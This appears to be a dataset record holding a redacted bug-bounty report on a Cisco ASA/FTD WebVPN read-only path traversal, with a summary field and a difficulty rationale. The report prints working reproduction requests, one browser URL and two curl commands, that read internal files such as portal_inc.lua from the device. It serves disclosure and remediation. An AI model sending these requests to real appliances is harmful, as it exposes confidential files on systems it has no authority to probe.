  "content": "\nSummary:\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 is vulnerable to Read-Only Path Traversal Vulnerability as described at https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-ro-path-KJuQhB86\nDescription:\nGet request parameters at the /+CSCOT+/translation-table and the /+CSCOT+/oem-customization are not properly sanitized which allows for reading files within the webroot directory that are not intended to be readable.\nAccording to Cisco:\nThe vulnerability is due to a lack of proper input validation of URLs in HTTP requests processed by an affected device. An attacker could exploit this vulnerability by sending a crafted HTTP request containing directory traversal character sequences to an affected device.\nStep-by-step Reproduction Instructions\nIn Browser:\nCopy and paste into your browser: \u2588\u2588\u2588/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../\"\nNote the file being requested to be download. This will be the source code for portal_inc.lua which is not normally accessible.\nIn curl:\ncurl -k \"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../\" to prove you can read internal files such as the /+CSCOE+/portal_inc.lua file.\nVarious internal files can be read, and some require using the --output command to output the data to a file as shown in step 3.\ncurl -k \"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/http_auth.html&default-language&lang=../\" --output session.js\nProduct, Version, and Configuration (If applicable)\nAnyConnect SSL VPN -webvpn\nClientless SSL VPN - webvpn\nSuggested Mitigation/Remediation Actions\nUpdate the software to the latest version via the Cisco advisory linked above in the Summary.\nImpact\nAn attacker can view arbitrary files within the web services file system on the targeted device that are meant to be internal or confidential. The web services file system is enabled when the affected device is configured with either WebVPN or AnyConnect features.\nCVSS Score: Base 7.5\nVector: https://tools.cisco.com/security/center/cvssCalculator.x?version=3.1&vector=CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N\n\n",

  "vuln_description": "The vulnerability allows an attacker to perform a path traversal attack on Cisco's SSL VPN (AnyConnect or Clientless) by manipulating URLs in HTTP requests to access arbitrary files within the web services file system. This is due to improper input validation of URLs containing directory traversal sequences.",
  "reason": "The attack is straightforward, involving only a crafted URL with directory traversal sequences. No complex interactions, state manipulations, or novel logic are required. The vulnerability is a classic path traversal flaw with a simple exploitation method.",
